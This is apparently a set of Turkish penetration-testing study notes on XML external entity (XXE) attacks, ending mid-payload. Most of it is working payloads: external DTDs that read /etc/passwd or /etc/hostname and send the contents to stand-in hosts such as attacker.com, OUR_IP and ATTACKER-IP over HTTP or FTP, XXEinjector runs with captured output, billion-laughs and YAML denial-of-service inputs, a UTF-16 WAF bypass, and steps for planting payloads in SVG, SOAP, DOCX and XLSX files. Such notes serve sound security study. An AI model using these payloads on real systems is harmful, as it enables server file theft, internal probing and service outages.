Payload'ı parçalara ayıralım:

1-`<!ENTITY % file SYSTEM “file:///etc/passwd”>` Bu satır, `/etc/passwd` dosyasının (kullanıcı hesabı ayrıntılarını içeren Unix benzeri bir sistem dosyası) içeriğine referans veren file adlı external bir entity tanımlar.

2-`<!ENTITY % eval “<!ENTITY &#x25; error SYSTEM ‘file:///nonexistent/%file;’>”>` Bu satır, başka bir entity tanımını tutan bir entity eval tanımlar. Bu diğer entity (error) var olmayan bir dosyaya referans vermek ve dosya yolunun sonuna dosya entity'sinin içeriğini (`/etc/passwd` içeriği) eklemek içindir. `&#x25;` bir entity tanımı içindeki bir entity'ye referans vermek için kullanılan URL kodlu bir ‘`%`’ dir.

3-`%eval;` Bu satır, entity hatasının tanımlanmasına neden olan eval entity'sini kullanır.

4-`%error;` Son olarak, bu satır `/etc/passwd` içeriğini içeren bir yolla var olmayan bir dosyaya erişmeye çalışan error entity'sini kullanır. Dosya mevcut olmadığından, bir hata oluşacaktır. Uygulama hatayı kullanıcıya geri bildirir ve hata mesajına dosya yolunu dahil ederse, `/etc/passwd` dosyasının içeriği hata mesajının bir parçası olarak ifşa edilecek ve hassas bilgiler açığa çıkacaktır.

### 99- Collaborator ile Basit Blind XXE (BurpSuite)

```
<?xml version="1.0" ?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> 
  %ext;
]>
<r></r>
```

- `%ext` adında bir **parameter entity** tanımlıyorsun.
- Bu entity'nin değeri, bir **uzaktaki (remote) URL'ye yapılan istek**.
- `%ext;` çağrıldığında parser bu URL'ye GET isteği atar.

#### Normal ENTITY ile Blind Request

```
<!DOCTYPE root [
  <!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>
]>
<root>&test;</root>
```

- `test` adında bir **ENTITY** tanımlanmış.
- Bu entity `&test;` çağrıldığında **remote bir sunucuya** istek gönderilir.
- Eğer parser bu URI’yi çözümlerken **internete istek atabiliyorsa**, Collaborator sunucusuna ulaşır.

Bu örnekte **parameter entity (`%`) değil**, normal **general entity (`&`)** kullanılıyor.


### Blind XXE ile Dosya İçeriği Sızdırma (ilk satır)

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
  <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>&callhome;</foo>

```

|Satır|Açıklama|
|---|---|
|`<!ENTITY % xxe SYSTEM "file:///etc/passwd" >`|Sistemdeki `/etc/passwd` dosyasını okur ve `%xxe;` adında bir entity tanımlar.|
|`<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">`|`callhome` adlı bir ENTITY oluşturur ve bu ENTITY'nin URL’sine, `%xxe;` (yani dosya içeriği) gömülür.|
|`<foo>&callhome;</foo>`|Bu ENTITY çağrıldığında, uygulama `malicious.com/?...` gibi bir adrese istek atmaya çalışır.|

- `/etc/passwd` dosyasının **ilk satırını** okur (neden ilk satır? çünkü bazı XML parser’lar URI’ye gömülen entity'lerde sadece ilk satırı çözümler),
- Bu satırı `www.malicious.com/?...` adresine gönderir.
- Saldırganın `malicious.com` loglarında `/?root:x:0:0:root:/root:/bin/bash` gibi bir istek görünür.


### 99- Out of Band XXE (PayloadsAllTheThings)

`parameterEntity_oob.dtd` dosyasını oluştur:

```
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
%all;
```
Not: `attacker.com` yerine kendi IP/ngrok adresini yaz.

```
python3 -m http.server 80
```

Dosyan `parameterEntity_oob.dtd` adında `/home/kali/` klasöründe olsun. Server çalışınca `http://<your-ip>/parameterEntity_oob.dtd` adresinden erişilebilir olur.

Hedef sisteme gönderilecek XML (senin yazacağın payload):

Bunu hedefte XML parser çalışan uygulamaya gönderiyorsun (örneğin file upload, SOAP endpoint, XML API vs).

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://attacker.com/parameterEntity_oob.dtd">
<data>&send;</data>
```

- `parameterEntity_oob.dtd` dosyasını uzaktan yükler (senin makinen).
- Dosya içindeki tanımları işler (`file`, `send`).
- `/sys/power/image_size` dosyasını okur.
- Şunu yapar:

```
GET http://attacker.com/?134217728
```
Sayı dosya içeriğidir, senin loglarına düşer.)

**`/sys/power/image_size`**, genellikle Linux sistemlerde bulunan bir **kernel parametresidir**. İçinde genelde bir sayı olur.  Bu neden kullanılıyor? Çünkü bu dosya: Hedef sistemde her zaman bulunur (Linux varsayılanı).

```
$ cat /sys/power/image_size
134217728
```


### DTD ve PHP Filtresi ile XXE OOB

Hedefe gönderilen XML

- `%sp`: Bu satır hedef sistemin dışarıdan (senin sunucundan) bir **DTD dosyası almasını** sağlar.
- `%param1;`: Bu parametre DTD içinden tanımlanacak.
- `&exfil;`: Enjekte edilen veri buraya basılır (response'a girer veya HTTP ile dışarı çıkar).


```
<?xml version="1.0" ?>
<!DOCTYPE r [
  <!ELEMENT r ANY >
  <!ENTITY % sp SYSTEM "http://attacker.com/dtd.xml"> 
  %sp;
  %param1;
]>
<r>&exfil;</r>
```

##### Senin sunucundaki `dtd.xml` dosyası:

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
```

- `%data`: Hedef sistemdeki `/etc/passwd` dosyasını okur ama doğrudan değil — önce `base64` olarak encode eder (çünkü normal metin bazı durumlarda hata çıkarır).

- `%param1`: Yeni bir `exfil` entity'si tanımlar. Bu entity, az önce okunan base64 veriyi senin sunucuna (`attacker.com`) gönderecek.

- **Sonuç olarak**: `<r>&exfil;</r>` kısmı çalıştığında, hedef sistem senin sunucuna şu şekilde bir istek yollar:

```
GET /?data=BASE64_ENCODED_ETC_PASSWD HTTP/1.1
Host: attacker.com
```

|Aşama|Açıklama|
|---|---|
|1|Hedef sistem dışarıdan DTD çeker (`attacker.com/dtd.xml`)|
|2|DTD, `php://filter` ile `/etc/passwd` dosyasını base64 olarak okur|
|3|Okunan içerik bir URL ile saldırgana gönderilir (`attacker.com/?data=...`)|
|4|Saldırgan bu URL’yi loglayarak base64 veriyi çözümleyebilir|

### 14- OOB (Out-of-Band) XXE ile Base64 Kodlu Veri Sızdırma (Blind XXE)

`Local`

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

`Local`

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

`Local`

```shell-session
C4RT3L@htb[/htb]$ vi index.php # Burada yukarıdaki PHP kodunu yazıyoruz
C4RT3L@htb[/htb]$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

`Hedef'te` 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

![Pasted image 20250513235700.png](/img/user/resimler/Pasted%20image%2020250513235700.png)

`Sonuç` 

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

### 15- XXEinjector ile Otomatik OOB XXE Saldırısı

```shell-session
C4RT3L@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

Cloning into 'XXEinjector'...
...SNIP...
```

Araca sahip olduğumuzda, HTTP isteğini Burp'ten kopyalayabilir ve aracın kullanması için bir dosyaya yazabiliriz. XML verisinin tamamını değil, sadece ilk satırını eklemeli ve araç için bir konum belirleyici olarak arkasına `XXEINJECT` yazmalıyız:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Şimdi, `--host/--httpport` bayrakları IP ve portumuz, `--file` bayrağı yukarıda yazdığımız dosya ve `--path` bayrağı okumak istediğimiz dosya olacak şekilde aracı çalıştırabiliriz. Yukarıda yaptığımız OOB saldırısını tekrarlamak için `--oob=http` ve `--phpfilter` bayraklarını da aşağıdaki gibi seçeceğiz:

```shell-session
C4RT3L@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

Aracın verileri doğrudan yazdırmadığını görüyoruz. Bunun nedeni, verileri `base64` kodlamamızdır, bu nedenle yazdırılmaz. Her durumda, sızan tüm dosyalar aracın altındaki `Logs` klasöründe saklanır ve dosyamızı orada bulabiliriz:

```shell-session
C4RT3L@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```


### 99-SSRF Saldırıları Gerçekleştirmek için XXE'den Yararlanma

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

### 99-YAML Attack (DOS)

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### 99-Parameters Laugh Attack

Sebastian Pipping tarafından, parametre varlıklarının gecikmeli yorumlanmasını kullanan Billion Laughs saldırısının bir varyantı.

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

* `%pe_1` adında bir parametre varlığı tanımlanır. Bu sadece bir HTML yorumudur (boş bir `<!-- -->`)
- `%pe_2` içinde `%pe_1` iki kez çağrılır. `&#37;` = `%` karakterinin XML’deki karakter referansıdır.
- Yani burada `%pe_2` şuna dönüşür:

```
<!----><!----><!---->
```

```
<!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
```

* `%pe_3`, `%pe_2`’yi iki kez çağırır ve arasına bir yorum daha koyar.

Bu şekilde **üstel olarak büyüyen** bir yapı oluşur:

|Entity|Açıklama|
|---|---|
|`%pe_1`|1 adet `<!-- -->`|
|`%pe_2`|2 × `%pe_1` = 2 yorum|
|`%pe_3`|2 × `%pe_2` = 4 yorum|
|`%pe_4`|2 × `%pe_3` = 8 yorum|
|…|ve böyle devam ederse **üstel artar**|

```
  %pe_4;
]>
<r/>
```

`%pe_4;` çağrıldığında, önce `%pe_3` çözülür, sonra `%pe_2`, sonra `%pe_1`... Böylece parser sürekli çözümleme yapmak zorunda kalır.

- `libxml2` (özellikle eski versiyonları) bu saldırıya karşı savunmasız olabilir.
- Java’daki bazı XML parser’lar varsayılan olarak parametre entity’lerini desteklemez ama yapılandırılırsa etkilenebilir.
- `Python lxml` ve `PHP libxml` gibi bazı popüler kütüphaneler savunmasızdır — eğer `resolve_entities=True` gibi seçenekler kullanılırsa.

XML kurallarına göre bir root element zorunludur. `<r/>` bu görevi yerine getiriyor.

### 99-Apache Karaf ile XXE OOB

CVE-2018-11788 sürümleri etkiliyor:

- Apache Karaf **≤ 4.2.1**
- Apache Karaf **≤ 4.1.6**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com">
  %dtd;
]>
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
  <feature name="deployer" version="2.0" install="auto">
  </feature>
</features>
```

- Bu satır, **bir parametre entity’si olarak `dtd`’yi tanımlar**.
- `dtd`, `http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com` adresinden çekilir.
- Bu, saldırganın kontrolünde olan bir DTD dosyası olmalıdır.
- Ya da [CanaryTokens](https://canarytokens.org/) gibi sistemlerle sadece bir **istek yapıldığını loglamak için** kullanılır (veri sızmadan, erişim tespiti yapılır).

```
%dtd;
```

- Yukarıda tanımlanan dış kaynağa gidilir, DTD içeriği buraya enjekte edilir.
- Yani `attacker.com/dtd.xml` içeriği buraya gelir.
- Eğer bu dosyada sistem dosyalarını okuyan veya başka yere veri gönderen entity’ler tanımlanmışsa, bunlar çalıştırılır.

Geri kalan XML (target-compatible)

```
<features name="my-features" ...>
    <feature name="deployer" version="2.0" install="auto"></feature>
</features>
```

- Bu XML, Apache Karaf’in beklediği formatta hazırlanmıştır.
- `features.xml` formatındaki yapı Apache Karaf’e eklenecek bileşenleri anlatır.
- Parser bu XML'i işlerken **DOCTYPE içeriğini de işler**, dolayısıyla XXE tetiklenmiş olur.

Canarytokens bu noktada sadece isteğin geldiğini loglar:

```
GET / HTTP/1.1
Host: 27av6zyg33g8q8xu338uvhnsc.canarytokens.com
User-Agent: Java/1.8.0_261
```

Alternatif Kullanım: Dosya Sızdırma (Payload)

* Senin sunucunda `dtd.xml` şöyle olabilirdi:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%send;
```

Bu durumda hedef sistem senin sunucuna şuna benzer istek yollar:  
`http://attacker.com/?data=root:x:0:0:root:/root:/bin/bash`

Not:  XML dosyasını deploy klasörüne gönderin.

[brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)

##### Apache Karaf ve `deploy` Klasörü

Apache Karaf, bir **OSGi tabanlı uygulama sunucusudur**. XML dosyalarını otomatik olarak işleyebileceği özel bir klasörü vardır:

##### `deploy/` Klasörü Nedir?

- Apache Karaf kurulduğunda, `deploy/` adında bir klasörle birlikte gelir.

- Bu klasöre **XML, JAR, KAR** gibi dosyaları attığında Karaf onları **otomatik olarak işler veya yükler.**

- Özellikle `features.xml` gibi dosyalar burada işlendiğinde içlerindeki **DOCTYPE** tanımlamaları da parse edilir. Yani **XXE tetiklenebilir**.

####  **Apache Karaf ve `deploy` Klasörü**

Apache Karaf, bir **OSGi tabanlı uygulama sunucusudur**. XML dosyalarını otomatik olarak işleyebileceği özel bir klasörü vardır:

##### 📂 `deploy/` Klasörü Nedir?

- Apache Karaf kurulduğunda, `deploy/` adında bir klasörle birlikte gelir.
- Bu klasöre **XML, JAR, KAR** gibi dosyaları attığında Karaf onları **otomatik olarak işler veya yükler.**
- Özellikle `features.xml` gibi dosyalar burada işlendiğinde içlerindeki **DOCTYPE** tanımlamaları da parse edilir. Yani **XXE tetiklenebilir**.

#####  Bu Saldırının Amacı

Senin örneğinde, **XXE içeren bir `features.xml` dosyası** hazırlanıyor.

##### Adımlar:

1. **Bu XML payload'ını `.xml` uzantısıyla kaydet**  
    Örn: `evil_features.xml`

2. **Apache Karaf sunucusunda `deploy/` klasörüne bu dosyayı kopyala**  
    Örn:

    ```bash
    cp evil_features.xml /opt/karaf/deploy/
    ```
    
    (dosya adı önemli değil, sadece `.xml` uzantısı olsun)
    
3. **Karaf bunu otomatik olarak işler**, içindeki `<!DOCTYPE ...>` kısmı çalışır.

4. Eğer `<!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">` gibi bir satır varsa, Karaf **senin kontrolündeki sunucudan DTD dosyasını çeker**.

5. Eğer bu DTD içinde bir **veri sızdırma mekanizması** varsa (örneğin `file:///etc/passwd` okuma + HTTP ile gönderme), o tetiklenir.

##### Örnek Senaryo (özetle)

- **Saldırgan**: Evil XML hazırlayıp `karafHost:/opt/karaf/deploy/` klasörüne gönderir.
- **Karaf**: Dosyayı otomatik işler.
- **XXE**: `<!ENTITY>` tanımı çalışır ve dış sunucuya istek gider (OOB).
- **Saldırgan**: Dış isteği alır ve sistemin içeriden istek attığını doğrular veya veri alır.

#####  Not: Gerçek saldırıda

- Canarytokens gibi hizmetlerle istek geldi mi diye bakılır.

- Gerçek veri sızdırmak için:

    ```dtd
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
    %all;
    ```


### 99-WAF Bypasses
#### Karakter Kodlaması ile Atlatma (Encoding Bypass)

##### Genel Durum

- **WAF (Web Application Firewall)**, gelen isteklerde zararlı içerik arar ve engeller.
- Ancak bazı WAF’lar, **XML dosyalarında kullanılan karakter kodlamalarını (encoding) iyi analiz edemez.**
- Bu durum, saldırganın aynı kötü amaçlı XML’i farklı bir karakter kodlamasıyla (mesela UTF-16) gönderdiğinde, WAF’ın **payload’u fark edememesi** anlamına gelir.

##### XML Parser’ların Kodlamayı Anlama Yöntemleri

XML dosyasının hangi karakter kodlamasında olduğunu anlamak için parser'lar (yani XML okuyucular) 4 farklı yöntem kullanır:

| Yöntem                        | Açıklama                                                                                                 |
| ----------------------------- | -------------------------------------------------------------------------------------------------------- |
| **HTTP Content-Type Başlığı** | HTTP isteği içinde `Content-Type: text/xml; charset=utf-8` gibi bilgiler olabilir.                       |
| **Byte Order Mark (BOM)**     | Dosyanın başında karakter kodlamasını gösteren özel baytlar (bytes) bulunur.                             |
| **Dosyanın İlk Baytları**     | Dosyanın ilk 4-5 baytına bakılarak UTF-8, UTF-16BE veya UTF-16LE olup olmadığı anlaşılır.                |
| **XML Declaration**           | Dosyada `<?xml version="1.0" encoding="UTF-8"?>` gibi bir satır bulunabilir ve bu da kodlamayı gösterir. |

##### Byte Order Mark (BOM) Nedir?

- Dosyanın başında yer alan, o dosyanın hangi kodlamada olduğunu gösteren birkaç baytlık özel işarettir.
- Örneğin:

    - **UTF-8 BOM:** `EF BB BF`
    - **UTF-16BE BOM:** `FE FF`
    - **UTF-16LE BOM:** `FF FE`

##### Örnek Hex (16’lık) Gösterim ve Anlamı

| Encoding | BOM (Başlangıç Baytları) | Örnek İlk Baytlar (Hex)               | Anlamı                       |
| -------- | ------------------------ | ------------------------------------- | ---------------------------- |
| UTF-8    | EF BB BF                 | `EF BB BF 3C 3F 78 6D 6C`             | `...<?xml` anlamına gelir.   |
| UTF-16BE | FE FF                    | `FE FF 00 3C 00 3F 00 78 00 6D 00 6C` | Büyük endian UTF-16 kodlama. |
| UTF-16LE | FF FE                    | `FF FE 3C 00 3F 00 78 00 6D 00 6C 00` | Küçük endian UTF-16 kodlama. |

##### Neden Bunu Kullanıyoruz?

Bazı WAF'lar örneğin sadece **UTF-8 olarak gelen XML içeriği** üzerinde filtre uygular, **UTF-16** kodlamalı içerik geldiğinde bu zararlı içeriği fark etmeyebilir.


##### Örnek Komut

Mesela elimizde `utf8exploit.xml` diye `UTF-8` kodlamalı zararlı bir XML dosyası var.  
Bunu `UTF-16BE` kodlamasına çevirmek için:

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

- `iconv`: Linux/Unix sistemlerde karakter kodlaması dönüşümü yapan komut.
- `-f UTF-8`: Kaynak dosyanın kodlaması UTF-8.
- `-t UTF-16BE`: Hedef kodlama UTF-16 Big Endian.
- Çıktı `utf16exploit.xml` dosyasına yazılır.

##### Özetle

- WAF’lar bazen sadece belirli karakter kodlamalarındaki kötü içerikleri yakalar.
- Farklı kodlamalarda (özellikle UTF-16 gibi) aynı zararlı XML’i göndererek WAF’ın filtresini atlatabilirsin.
- `iconv` ile kolayca kodlama değiştirip test yapabilirsin.

Örnek: Bazı WAF'ları atlamak için [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html) kullanarak payload'u UTF-16'ya dönüştürebiliriz:


### 99-XXE SVG İçinde

- **SVG** (Scalable Vector Graphics), XML formatında grafik tanımlama dosyasıdır.

- SVG dosyası içine XXE payload koyarak, hedef sunucunun dış kaynaklara (örneğin kendi kontrolündeki bir sunucuya) veri göndermesi sağlanabilir.

- Bu, özellikle doğrudan veri alınamadığında (blind XXE) kullanılır; veri **remote** gönderilir, sunucu cevap vermez ama dış dünyaya veri sızdırılır.

`xxe.svg` dosyası

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg ...>
  ...
  <flowPara>&exfil;</flowPara>
</svg>
```

- Burada `DOCTYPE` içinde `%sp;` var. Bu, `http://example.org:8080/xxe.xml` adresinden **dışarıdan bir DTD dosyasını** yüklüyor.

- Bu external DTD (`xxe.xml`) içindeki entityler tanımlanacak.

- Sonrasında `%param1;` entity’si çağrılıyor, bu da external DTD’de tanımlı.

- SVG içindeki `<flowPara>&exfil;</flowPara>` kısmı ise, `%param1;` içindeki `exfil` entity'sinin açılımını yapıyor.

`xxe.xml` dosyası

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

- `%data` entity’si, PHP filtresi kullanarak `/etc/hostname` dosyasının içeriğini **base64 olarak encode** ediyor.

- `%param1` entity’si, `exfil` adlı bir entity tanımlıyor. Bu entity ise, bir **FTP sunucusuna** (örnek: `ftp://example.org:2121/`) bu base64 kodlanmış dosya içeriğini yollamaya çalışıyor.

##### Ne oluyor?

1. Hedef sunucu `xxe.svg` dosyasını işlerken `DOCTYPE` içindeki `%sp;` sayesinde dışarıdaki `xxe.xml` dosyasını indiriyor.

2. Bu dış dosyada, `%data` ile `/etc/hostname` dosyasının base64 hali elde ediliyor.

3. `%param1` ile `exfil` entity’si tanımlanıyor ve bu entity “`ftp://example.org:2121/BASE64_ENCODED_DATA`” adresine veri gönderiyor.

4. SVG içindeki `&exfil;` entity'si bu FTP çağrısını tetikliyor.

5. Böylece `/etc/hostname` dosyası içeriği hedef sunucudan **FTP ile dış dünyaya sızdırılmış oluyor**.

- Eğer FTP çıkışı yoksa, `http://...`, `gopher://...` veya `dns://...` gibi başka protokollerle de veri sızdırabiliriz.

##### Özet

- **SVG dosyası içine XXE yükledik.**
- **Dışarıdan bir DTD dosyası çağrılıyor.**
- Dış DTD, hedef dosyanın içeriğini base64 encode edip FTP’ye gönderiyor.
- Hedef sunucu, bu SVG’yi işlerken dosya içeriğini bizim kontrolümüzdeki sunucuya **Out-Of-Band** olarak sızdırıyor.

##### Neden Önemli?

- Doğrudan hedeften veri almak mümkün değilse (örneğin direkt response’a veri gelmiyorsa),
- Bu tür OOB yöntemlerle dosya sızdırmak mümkün olur.
- Ayrıca base64 kullanımı, dosya içeriğinin bozulmadan, güvenli şekilde gönderilmesini sağlar.


### 99- XXE SOAP İçinde

```xml
<soap:Body>
  <foo>
    <![CDATA[
    <!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER-IP:PORT/evil.dtd"> %dtd;]>
    <xxx/>
    ]]>
  </foo>
</soap:Body>
```

`evil.dtd` dosyasını saldırgan sunucuda barındır:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'ftp://ATTACKER-IP/%file;'>">
%eval;
```

- Hedef sunucuya yukarıdaki SOAP XML payload’u gönder.
- FTP, HTTP veya DNS loglarından veri sızdırıldığını kontrol et.

Hedef Sistem php değilse: 

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```


### 99- XXE Inside DOCX file

`.docx`, `.xlsx`, `.pptx` gibi Office dosyaları **sadece metin dosyaları değildir** — aslında **ZIP arşividir.** İçerisinde XML dosyaları barındırır. Bu XML dosyaları Office içeriğini tanımlar.

**Senin amacın**: Bu XML’lerin birine XXE payload'ı enjekte ederek uygulamanın bu dosyayı işlerken arka planda bir `XML Parser` çalıştırmasını sağlamak.

##### Office Dosyasının İç Yapısı

Bir `.docx` dosyasını `.zip` uzantılı gibi düşün.

Örnek bir DOCX yapısı:

```
xxe.docx/
├── [Content_Types].xml
├── _rels/.rels
├── word/document.xml ← genellikle buraya payload konur
├── word/_rels/document.xml.rels
└── docProps/core.xml
```

1. Boş bir .docx dosyası oluştur

Word'de boş bir dosya kaydet: `xxe.docx`

2. Dosyayı `.zip` olarak yeniden adlandır ve aç

```
cp xxe.docx xxe.zip
unzip xxe.zip -d xxe_dir
cd xxe_dir
```

3. Payload'ı yerleştir

En sık kullanılan hedef: `word/document.xml`

Örnek Payload (XXE):

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker.com/payload.dtd">
  %xxe;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&exfil;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

Yukarıdaki örnekte:

- `attacker.com` senin kontrolündeki bir **OOB endpoint** (Canarytoken, Burp Collaborator, vb.).
- `payload.dtd`, hedefteki dosyayı dışarı aktaran secondary payload'dır.

4. XML dosyasını tekrar ZIP'e ekle

```
zip -u ../xxe.docx word/document.xml
```

5. Hedef uygulamaya bu dosyayı yükle

Eğer uygulama, bu `.docx` dosyasını bir şekilde **açıyor veya analiz ediyorsa** (örneğin virüs tarayıcı, belge dönüştürücü, içerik analiz motoru vb.) XML parser çalıştırılacaktır ve **XXE tetiklenecektir.**


Otomatik Araç: [`oxml_xxe`](https://github.com/BuffaloWill/oxml_xxe)

Manuel uğraşmak istemiyorsan, bu tool ile otomatik payload ekleyebilirsin:

```
python oxml_xxe.py xxe.docx http://attacker.com/payload.dtd
```

Bu script:

- `.docx`, `.pptx`, `.xlsx` gibi Office dosyalarını açar,
- XML dosyalarının içine **XXE payload’ı otomatik olarak gömer**,
- Dosyayı tekrar oluşturur.


Hangi Formatlar Destekleniyor?

|Format|Açıklama|
|---|---|
|DOCX|Word dosyası|
|XLSX|Excel dosyası|
|PPTX|PowerPoint dosyası|
|ODT/ODG/ODS|LibreOffice dosyaları|
|SVG|Görsel içerikli XML|
|XML|Düz XML dosyası|
|PDF|Deneysel olarak destekleniyor (karmaşık)|
|JPG/GIF|EXIF içinden deneme amaçlı (çok nadir çalışır)|

Özet : 

```
XXE via DOCX (Office XML)

1. Boş bir .docx oluştur
2. `.zip` olarak yeniden adlandır: `cp x.docx x.zip`
3. `unzip x.zip -d dir/`
4. `word/document.xml` içine XXE payload yerleştir
5. `zip -u x.docx word/document.xml` ile güncelle
6. Hedef uygulamaya yükle
7. OOB (DNS/HTTP/FTP) yanıtlarını dinle

Tool: https://github.com/BuffaloWill/oxml_xxe
```


### 99-XXE XLSX dosyasının içinde

Bir `.xlsx` dosyası aslında **sıkıştırılmış (ZIP formatında)** bir klasördür. İçinde bir sürü XML dosyası barındırır ve bu XML dosyaları Excel dosyasının içeriğini (veriler, stil, shared strings vb.) tanımlar.

Bu nedenle `.xlsx` dosyasını açtığınızda şu gibi bir yapı görürsünüz:

```
xl/workbook.xml              --> Excel dosyasının ana iskeleti
xl/sharedStrings.xml         --> Hücrelerdeki metinler burada
xl/worksheets/sheet1.xml     --> Sayfanın içeriği
[Content_Types].xml          --> Tür tanımları
_rels/.rels                  --> İlişkiler
...
```

Hedef: Bu XML dosyalarından birine XXE payload yerleştirerek dışarı bilgi sızdırmak

##### Gerekli Araçlar:

1. `7z` → dosyayı çıkarmak için (veya `unzip`)
2. `zip -u` → dosyayı yeniden güncellemek için
3. `Python HTTP + FTP server` (örn. [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv))
4. Payload yerleştirilecek dosya editörü (örneğin `vim`, `nano`, `code`, `notepad++`)

1-Excel Dosyasını Aç
* Önce `.xlsx` dosyasını bir klasöre çıkartalım:

```
7z x -oXXE xxe.xlsx
```

Bu işlem sonunda `XXE` klasöründe açılmış XML dosyaları olacak.

2.  Payload'u Enjekte Et

 Örnek olarak: `xl/workbook.xml` içine blind XXE payload'u ekleyelim:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [
  <!ELEMENT cdl ANY >
